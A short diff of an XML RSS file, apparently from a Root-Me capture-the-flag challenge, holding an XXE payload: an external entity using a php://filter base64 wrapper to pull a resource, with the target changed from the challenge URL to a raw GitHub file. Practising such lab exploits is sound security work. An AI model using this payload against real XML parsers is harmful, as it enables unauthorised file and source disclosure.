@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE roottag [ 
- <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=http://challenge01.root-me.org/web-serveur/ch29/index.php">
+ <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=https://raw.githubusercontent.com/pszot/publicscripts/f7a01d2455beccbd6b749ebe34f3ed8f584f4b2a/xml.xml">
 ]>
 <rss version="2.0">
 <channel>
